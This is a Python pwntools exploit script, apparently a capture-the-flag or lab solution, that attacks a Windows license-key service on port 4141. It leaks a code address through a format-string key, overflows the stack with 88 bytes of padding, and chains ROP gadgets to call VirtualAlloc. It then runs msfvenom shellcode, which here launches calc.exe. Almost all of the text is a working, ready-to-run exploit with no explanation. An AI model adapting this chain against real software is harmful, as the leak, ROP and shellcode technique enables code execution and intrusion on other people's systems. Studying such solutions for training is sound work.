#!/usr/bin/python3
from pwn import remote, p64, base64

shell = remote("Windows", 4141)
shell.sendlineafter(b"Exit", b"1")
shell.sendlineafter(b"key: ", b"%pX-FE9A1-500-A270-0194")
shell.sendlineafter(b"Exit", b"2")

shell.recvuntil(b"Checking key: ")
binary_base = int(shell.recv(16), 16) - 0x20660

# !py mona pattern_offset eip
offset = 88
junk = b"A" * offset

"""
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,        (ESP)
  [in]           SIZE_T dwSize,           (0x1)
  [in]           DWORD  flAllocationType, (0x1000)
  [in]           DWORD  flProtect         (0x40)
);
"""

rop  = b""
rop += p64(binary_base + 0x4df1)  # pop rbx; pop rbp; ret;
rop += p64(0x1000)                # flAllocationType
rop += p64(0x4141414141414141)    # padding for pop
rop += p64(binary_base + 0x1f90)  # mov r9, rbx; mov r8, 0; add rsp, 8; ret;
rop += p64(0x4141414141414141)    # padding for add
rop += p64(binary_base + 0x3918)  # add r8, r9; add rax, r8; ret;
rop += p64(binary_base + 0x47b3)  # pop r13; ret;
rop += p64(0x40)                  # flProtect
rop += p64(binary_base + 0x150a)  # pop rax; ret;
rop += p64(binary_base + 0x150a)  # pop rax; ret;
rop += p64(binary_base + 0x368f)  # mov rdx, r13; call rax;
rop += p64(binary_base + 0x1f27f) # xor rax, rax;
rop += p64(binary_base + 0x1f37d) # cmove r9, rdx; mov rax, r9; ret;
rop += p64(binary_base + 0x47b3)  # pop r13; ret;
rop += p64(0x1)                   # dwSize
rop += p64(binary_base + 0x150a)  # pop rax; ret;
rop += p64(binary_base + 0x150a)  # pop rax; ret;
rop += p64(binary_base + 0x368f)  # mov rdx, r13; call rax;
rop += p64(binary_base + 0x20d9)  # pop rbx; ret;
rop += p64(0x0)                   # value for xor
rop += p64(binary_base + 0x1fa0)  # xor rbx, rsp; ret;
rop += p64(binary_base + 0x1fc2)  # push rbx; pop rax; ret;
rop += p64(binary_base + 0x1f80)  # mov rcx, rax; ret;
rop += p64(binary_base + 0x20d9)  # pop rbx; ret;
rop += p64(binary_base + 0x20000) # VirtualAlloc()
rop += p64(binary_base + 0x1ec79) # jmp qword ptr [rbx];
rop += p64(binary_base + 0x2029)  # add rsp, 0x10; ret;
rop += p64(0x4141414141414141)    # padding for add
rop += p64(0x4141414141414141)    # padding for add
rop += p64(binary_base + 0x2bb9)  # push rsp; add eax, esi; ret;

# msfvenom -p windows/x64/exec CMD=calc.exe -f python -v shellcode
shellcode =  b""
shellcode += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41"
shellcode += b"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48"
shellcode += b"\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20"
shellcode += b"\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31"
shellcode += b"\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
shellcode += b"\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41"
shellcode += b"\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0"
shellcode += b"\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67"
shellcode += b"\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20"
shellcode += b"\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34"
shellcode += b"\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac"
shellcode += b"\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
shellcode += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
shellcode += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
shellcode += b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
shellcode += b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a"
shellcode += b"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41"
shellcode += b"\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
shellcode += b"\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00"
shellcode += b"\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00"
shellcode += b"\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
shellcode += b"\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
shellcode += b"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
shellcode += b"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
shellcode += b"\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65"
shellcode += b"\x00"

payload = junk + rop + shellcode

shell.sendlineafter(b"Exit", b"1")
shell.sendlineafter(b"key: ", b"100-FE9A1-500-A270-0102-" + base64.b64encode(payload))
shell.sendlineafter(b"Exit", b"2")
